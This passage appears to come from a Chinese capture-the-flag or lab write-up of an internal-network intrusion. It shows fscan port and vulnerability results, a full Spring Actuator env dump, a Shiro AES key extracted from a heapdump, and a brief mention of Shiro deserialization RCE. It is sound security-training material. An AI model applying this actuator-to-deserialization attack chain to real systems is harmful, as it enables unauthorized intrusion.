</span></span><span class="line"><span class="ln">29</span><span class="cl">[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.26:22
</span></span><span class="line"><span class="ln">30</span><span class="cl">[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.33:22
</span></span><span class="line"><span class="ln">31</span><span class="cl">[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.26:21
</span></span><span class="line"><span class="ln">32</span><span class="cl">[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.33:8080
</span></span><span class="line"><span class="ln">33</span><span class="cl">[2025-05-16 12:56:26] [SUCCESS] 端口开放 172.28.23.17:8080
</span></span><span class="line"><span class="ln">34</span><span class="cl">[2025-05-16 12:56:26] [SUCCESS] 服务识别 172.28.23.17:22 =<span class="p">&gt;</span> [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.7 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.7.]
</span></span><span class="line"><span class="ln">35</span><span class="cl">[2025-05-16 12:56:27] [SUCCESS] 服务识别 172.28.23.26:22 =<span class="p">&gt;</span> [ssh] 版本:7.2p2 Ubuntu 4ubuntu2.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.10.]
</span></span><span class="line"><span class="ln">36</span><span class="cl">[2025-05-16 12:56:27] [SUCCESS] 服务识别 172.28.23.33:22 =<span class="p">&gt;</span> [ssh] 版本:8.2p1 Ubuntu 4ubuntu0.10 产品:OpenSSH 系统:Linux 信息:Ubuntu Linux; protocol 2.0 Banner:[SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.10.]
</span></span><span class="line"><span class="ln">37</span><span class="cl">[2025-05-16 12:56:27] [SUCCESS] 服务识别 172.28.23.26:21 =<span class="p">&gt;</span> [ftp] 版本:3.0.3 产品:vsftpd 系统:Unix Banner:[220 (vsFTPd 3.0.3).]
</span></span><span class="line"><span class="ln">38</span><span class="cl">[2025-05-16 12:56:32] [SUCCESS] 服务识别 172.28.23.33:8080 =<span class="p">&gt;</span> [http]
</span></span><span class="line"><span class="ln">39</span><span class="cl">[2025-05-16 12:56:32] [SUCCESS] 服务识别 172.28.23.17:8080 =<span class="p">&gt;</span> [http]
</span></span><span class="line"><span class="ln">40</span><span class="cl">[2025-05-16 12:56:33] [SUCCESS] 服务识别 172.28.23.17:80 =<span class="p">&gt;</span> [http]
</span></span><span class="line"><span class="ln">41</span><span class="cl">[2025-05-16 12:56:33] [SUCCESS] 服务识别 172.28.23.26:80 =<span class="p">&gt;</span> [http]
</span></span><span class="line"><span class="ln">42</span><span class="cl">[2025-05-16 12:56:33] [INFO] 存活端口数量: 8
</span></span><span class="line"><span class="ln">43</span><span class="cl">[2025-05-16 12:56:33] [INFO] 开始漏洞扫描
</span></span><span class="line"><span class="ln">44</span><span class="cl">[2025-05-16 12:56:33] [INFO] 加载的插件: ftp, ssh, webpoc, webtitle
</span></span><span class="line"><span class="ln">45</span><span class="cl">[2025-05-16 12:56:33] [SUCCESS] 网站标题 http://172.28.23.17       状态码:200 长度:10887  标题:<span class="s2">&#34;&#34;</span>
</span></span><span class="line"><span class="ln">46</span><span class="cl">[2025-05-16 12:56:33] [SUCCESS] 网站标题 http://172.28.23.17:8080  状态码:200 长度:1027   标题:Login Form
</span></span><span class="line"><span class="ln">47</span><span class="cl">[2025-05-16 12:56:33] [SUCCESS] 网站标题 http://172.28.23.26       状态码:200 长度:13693  标题:新翔OA管理系统-OA管理平台联系电话：13849422648微信同号，QQ958756413
</span></span><span class="line"><span class="ln">48</span><span class="cl">[2025-05-16 12:56:33] [SUCCESS] 网站标题 http://172.28.23.33:8080  状态码:302 长度:0      标题:无标题 重定向地址: http://172.28.23.33:8080/login;jsessionid=AE63E07F48E94D58CCBB77518E0021A7
</span></span><span class="line"><span class="ln">49</span><span class="cl">[2025-05-16 12:56:33] [SUCCESS] 匿名登录成功!
</span></span><span class="line"><span class="ln">50</span><span class="cl">[2025-05-16 12:56:33] [SUCCESS] 网站标题 http://172.28.23.33:8080/login;jsessionid=AE63E07F48E94D58CCBB77518E0021A7 状态码:200 长度:3860   标题:智联科技 ERP 后台登陆
</span></span><span class="line"><span class="ln">51</span><span class="cl">[2025-05-16 12:56:34] [SUCCESS] 目标: http://172.28.23.17:8080
</span></span><span class="line"><span class="ln">52</span><span class="cl">  漏洞类型: poc-yaml-thinkphp5023-method-rce
</span></span><span class="line"><span class="ln">53</span><span class="cl">  漏洞名称: poc1
</span></span><span class="line"><span class="ln">54</span><span class="cl">  详细信息:
</span></span><span class="line"><span class="ln">55</span><span class="cl">        links:https://github.com/vulhub/vulhub/tree/master/thinkphp/5.0.23-rce
</span></span><span class="line"><span class="ln">56</span><span class="cl">[2025-05-16 12:56:34] [SUCCESS] 目标: http://172.28.23.33:8080
</span></span><span class="line"><span class="ln">57</span><span class="cl">  漏洞类型: poc-yaml-spring-actuator-heapdump-file
</span></span><span class="line"><span class="ln">58</span><span class="cl">  漏洞名称: 
</span></span><span class="line"><span class="ln">59</span><span class="cl">  详细信息:
</span></span><span class="line"><span class="ln">60</span><span class="cl">        author:AgeloVito
</span></span><span class="line"><span class="ln">61</span><span class="cl">        links:https://www.cnblogs.com/wyb628/p/8567610.html
</span></span><span class="line"><span class="ln">62</span><span class="cl">[2025-05-16 12:56:35] [SUCCESS] 目标: http://172.28.23.33:8080
</span></span><span class="line"><span class="ln">63</span><span class="cl">  漏洞类型: poc-yaml-springboot-env-unauth
</span></span><span class="line"><span class="ln">64</span><span class="cl">  漏洞名称: spring2
</span></span><span class="line"><span class="ln">65</span><span class="cl">  详细信息:
</span></span><span class="line"><span class="ln">66</span><span class="cl">        links:https://github.com/LandGrey/SpringBootVulExploit
</span></span></code></pre></div><p>扫到另外两台机子</p>
<pre tabindex="0"><code>[2025-05-16 12:56:20] [SUCCESS] 目标 172.28.23.33    存活 (ICMP)
[2025-05-16 12:56:20] [SUCCESS] 目标 172.28.23.17    存活 (ICMP) //入口机
[2025-05-16 12:56:20] [SUCCESS] 目标 172.28.23.26    存活 (ICMP)
</code></pre><p>其中33扫出来存在spring Actuator未授权访问和env泄露</p>
<p><img alt="image-20250516130937261" loading="lazy" src="../assets/image-20250516130937261.png"></p>
<p><a href="https://cloud.tencent.com/developer/article/2070446">Springboot Actuator未授权访问漏洞复现-腾讯云开发者社区-腾讯云</a></p>
<p><img alt="image-20250516131046898" loading="lazy" src="../assets/image-20250516131046898.png"></p>
<p>/actuator/env</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="ln">1</span><span class="cl"><span class="p">{</span><span class="nt">&#34;activeProfiles&#34;</span><span class="p">:[],</span><span class="nt">&#34;propertySources&#34;</span><span class="p">:[{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;server.ports&#34;</span><span class="p">,</span><span class="nt">&#34;properties&#34;</span><span class="p">:{</span><span class="nt">&#34;local.server.port&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="mi">8080</span><span class="p">}}},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;servletContextInitParams&#34;</span><span class="p">,</span><span class="nt">&#34;properties&#34;</span><span class="p">:{}},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;systemProperties&#34;</span><span class="p">,</span><span class="nt">&#34;properties&#34;</span><span class="p">:{</span><span class="nt">&#34;java.runtime.name&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;OpenJDK Runtime Environment&#34;</span><span class="p">},</span><span class="nt">&#34;java.protocol.handler.pkgs&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;org.springframework.boot.loader&#34;</span><span class="p">},</span><span class="nt">&#34;sun.boot.library.path&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/amd64&#34;</span><span class="p">},</span><span class="nt">&#34;java.vm.version&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;25.392-b08&#34;</span><span class="p">},</span><span class="nt">&#34;java.vm.vendor&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;Private Build&#34;</span><span class="p">},</span><span class="nt">&#34;java.vendor.url&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;http://java.oracle.com/&#34;</span><span class="p">},</span><span class="nt">&#34;path.separator&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;:&#34;</span><span class="p">},</span><span class="nt">&#34;java.vm.name&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;OpenJDK 64-Bit Server VM&#34;</span><span class="p">},</span><span class="nt">&#34;file.encoding.pkg&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;sun.io&#34;</span><span class="p">},</span><span class="nt">&#34;user.country&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;US&#34;</span><span class="p">},</span><span class="nt">&#34;sun.java.launcher&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;SUN_STANDARD&#34;</span><span class="p">},</span><span class="nt">&#34;sun.os.patch.level&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;unknown&#34;</span><span class="p">},</span><span class="nt">&#34;PID&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;663&#34;</span><span class="p">},</span><span class="nt">&#34;java.vm.specification.name&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;Java Virtual Machine Specification&#34;</span><span class="p">},</span><span class="nt">&#34;user.dir&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/&#34;</span><span class="p">},</span><span class="nt">&#34;java.runtime.version&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;1.8.0_392-8u392-ga-1~20.04-b08&#34;</span><span class="p">},</span><span class="nt">&#34;java.awt.graphicsenv&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;sun.awt.X11GraphicsEnvironment&#34;</span><span class="p">},</span><span class="nt">&#34;java.endorsed.dirs&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/endorsed&#34;</span><span class="p">},</span><span class="nt">&#34;os.arch&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;amd64&#34;</span><span class="p">},</span><span class="nt">&#34;CONSOLE_LOG_CHARSET&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">},</span><span class="nt">&#34;java.io.tmpdir&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/tmp&#34;</span><span class="p">},</span><span class="nt">&#34;line.separator&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;\n&#34;</span><span class="p">},</span><span class="nt">&#34;java.vm.specification.vendor&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;Oracle Corporation&#34;</span><span class="p">},</span><span class="nt">&#34;os.name&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;Linux&#34;</span><span class="p">},</span><span class="nt">&#34;FILE_LOG_CHARSET&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">},</span><span class="nt">&#34;sun.jnu.encoding&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">},</span><span class="nt">&#34;spring.beaninfo.ignore&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;true&#34;</span><span class="p">},</span><span class="nt">&#34;java.library.path&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/usr/java/packages/lib/amd64:/usr/lib/x86_64-linux-gnu/jni:/lib/x86_64-linux-gnu:/usr/lib/x86_64-linux-gnu:/usr/lib/jni:/lib:/usr/lib&#34;</span><span class="p">},</span><span class="nt">&#34;java.specification.name&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;Java Platform API Specification&#34;</span><span class="p">},</span><span class="nt">&#34;java.class.version&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;52.0&#34;</span><span class="p">},</span><span class="nt">&#34;sun.management.compiler&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;HotSpot 64-Bit Tiered Compilers&#34;</span><span class="p">},</span><span class="nt">&#34;os.version&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;5.4.0-169-generic&#34;</span><span class="p">},</span><span class="nt">&#34;user.home&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/home/ops01&#34;</span><span class="p">},</span><span class="nt">&#34;catalina.useNaming&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;false&#34;</span><span class="p">},</span><span class="nt">&#34;user.timezone&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;Asia/Shanghai&#34;</span><span class="p">},</span><span class="nt">&#34;java.awt.printerjob&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;sun.print.PSPrinterJob&#34;</span><span class="p">},</span><span class="nt">&#34;file.encoding&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">},</span><span class="nt">&#34;java.specification.version&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;1.8&#34;</span><span class="p">},</span><span class="nt">&#34;catalina.home&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/tmp/tomcat.8080.6309224585124471589&#34;</span><span class="p">},</span><span class="nt">&#34;java.class.path&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/opt/erp/ERPApplication-0.0.1-SNAPSHOT.jar&#34;</span><span class="p">},</span><span class="nt">&#34;user.name&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;ops01&#34;</span><span class="p">},</span><span class="nt">&#34;java.vm.specification.version&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;1.8&#34;</span><span class="p">},</span><span class="nt">&#34;sun.java.command&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;******&#34;</span><span class="p">},</span><span class="nt">&#34;java.home&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/usr/lib/jvm/java-8-openjdk-amd64/jre&#34;</span><span class="p">},</span><span class="nt">&#34;sun.arch.data.model&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;64&#34;</span><span class="p">},</span><span class="nt">&#34;user.language&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;en&#34;</span><span class="p">},</span><span class="nt">&#34;java.specification.vendor&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;Oracle Corporation&#34;</span><span class="p">},</span><span class="nt">&#34;awt.toolkit&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;sun.awt.X11.XToolkit&#34;</span><span class="p">},</span><span class="nt">&#34;java.vm.info&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;mixed mode&#34;</span><span class="p">},</span><span class="nt">&#34;java.version&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;1.8.0_392&#34;</span><span class="p">},</span><span class="nt">&#34;java.ext.dirs&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/ext:/usr/java/packages/lib/ext&#34;</span><span class="p">},</span><span class="nt">&#34;sun.boot.class.path&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/resources.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/rt.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/sunrsasign.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jsse.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jce.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/charsets.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/lib/jfr.jar:/usr/lib/jvm/java-8-openjdk-amd64/jre/classes&#34;</span><span class="p">},</span><span class="nt">&#34;java.awt.headless&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;true&#34;</span><span class="p">},</span><span class="nt">&#34;java.vendor&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;Private Build&#34;</span><span class="p">},</span><span class="nt">&#34;catalina.base&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/tmp/tomcat.8080.6309224585124471589&#34;</span><span class="p">},</span><span class="nt">&#34;java.specification.maintenance.version&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;5&#34;</span><span class="p">},</span><span class="nt">&#34;file.separator&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/&#34;</span><span class="p">},</span><span class="nt">&#34;java.vendor.url.bug&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;http://bugreport.sun.com/bugreport/&#34;</span><span class="p">},</span><span class="nt">&#34;sun.io.unicode.encoding&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;UnicodeLittle&#34;</span><span class="p">},</span><span class="nt">&#34;sun.cpu.endian&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;little&#34;</span><span class="p">},</span><span class="nt">&#34;sun.cpu.isalist&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">}}},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;systemEnvironment&#34;</span><span class="p">,</span><span class="nt">&#34;properties&#34;</span><span class="p">:{</span><span class="nt">&#34;PATH&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;System Environment Property \&#34;PATH\&#34;&#34;</span><span class="p">},</span><span class="nt">&#34;INVOCATION_ID&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;18b641dc6657423cbdeab6262fd1ee07&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;System Environment Property \&#34;INVOCATION_ID\&#34;&#34;</span><span class="p">},</span><span class="nt">&#34;JOURNAL_STREAM&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;9:19204&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;System Environment Property \&#34;JOURNAL_STREAM\&#34;&#34;</span><span class="p">},</span><span class="nt">&#34;LOGNAME&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;ops01&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;System Environment Property \&#34;LOGNAME\&#34;&#34;</span><span class="p">},</span><span class="nt">&#34;USER&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;ops01&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;System Environment Property \&#34;USER\&#34;&#34;</span><span class="p">},</span><span class="nt">&#34;PWD&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;System Environment Property \&#34;PWD\&#34;&#34;</span><span class="p">},</span><span class="nt">&#34;LANG&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;en_US.UTF-8&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;System Environment Property \&#34;LANG\&#34;&#34;</span><span class="p">},</span><span class="nt">&#34;SHLVL&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;0&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;System Environment Property \&#34;SHLVL\&#34;&#34;</span><span class="p">},</span><span class="nt">&#34;HOME&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/home/ops01&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;System Environment Property \&#34;HOME\&#34;&#34;</span><span class="p">},</span><span class="nt">&#34;_&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;/usr/bin/java&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;System Environment Property \&#34;_\&#34;&#34;</span><span class="p">}}},{</span><span class="nt">&#34;name&#34;</span><span class="p">:</span><span class="s2">&#34;Config resource &#39;class path resource [application.properties]&#39; via location &#39;optional:classpath:/&#39;&#34;</span><span class="p">,</span><span class="nt">&#34;properties&#34;</span><span class="p">:{</span><span class="nt">&#34;server.port&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;8080&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 1:13&#34;</span><span class="p">},</span><span class="nt">&#34;management.endpoints.jmx.exposure.include&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;*&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 3:43&#34;</span><span class="p">},</span><span class="nt">&#34;management.endpoints.web.exposure.include&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;*&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 4:43&#34;</span><span class="p">},</span><span class="nt">&#34;management.endpoint.health.show-details&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;always&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 5:41&#34;</span><span class="p">},</span><span class="nt">&#34;spring.thymeleaf.cache&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;true&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 8:24&#34;</span><span class="p">},</span><span class="nt">&#34;spring.thymeleaf.check-template&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;true&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 9:33&#34;</span><span class="p">},</span><span class="nt">&#34;spring.thymeleaf.check-template-location&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;true&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 10:42&#34;</span><span class="p">},</span><span class="nt">&#34;spring.thymeleaf.content-type&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;text/html&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 11:31&#34;</span><span class="p">},</span><span class="nt">&#34;spring.thymeleaf.enabled&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;true&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 12:26&#34;</span><span class="p">},</span><span class="nt">&#34;spring.thymeleaf.encoding&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 13:27&#34;</span><span class="p">},</span><span class="nt">&#34;spring.thymeleaf.excluded-view-names&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 15:0&#34;</span><span class="p">},</span><span class="nt">&#34;spring.thymeleaf.mode&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;HTML5&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 15:23&#34;</span><span class="p">},</span><span class="nt">&#34;spring.thymeleaf.prefix&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;classpath:/templates/&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 16:25&#34;</span><span class="p">},</span><span class="nt">&#34;spring.thymeleaf.suffix&#34;</span><span class="p">:{</span><span class="nt">&#34;value&#34;</span><span class="p">:</span><span class="s2">&#34;.html&#34;</span><span class="p">,</span><span class="nt">&#34;origin&#34;</span><span class="p">:</span><span class="s2">&#34;class path resource [application.properties] from ERPApplication-0.0.1-SNAPSHOT.jar - 17:25&#34;</span><span class="p">}}}]}</span>
</span></span></code></pre></div><p>用<a href="https://github.com/whwlsfb/JDumpSpider">whwlsfb/JDumpSpider: HeapDump敏感信息提取工具</a>自动提取heapdump敏感信息</p>
<p><img alt="image-20250516133111669" loading="lazy" src="../assets/image-20250516133111669.png"></p>
<p>可以拿到shiro key</p>
<pre tabindex="0"><code>===========================================
CookieRememberMeManager(ShiroKey)
-------------
algMode = GCM, key = AZYyIgMYhG6/CzIJlvpR2g==, algName = AES

===========================================
</code></pre><p><img alt="image-20250516133356045" loading="lazy" src="../assets/image-20250516133356045.png"></p>
<p>shiro反序列化打CB链，成功RCE</p>
<p>没有找到flag，说明要提权</p>
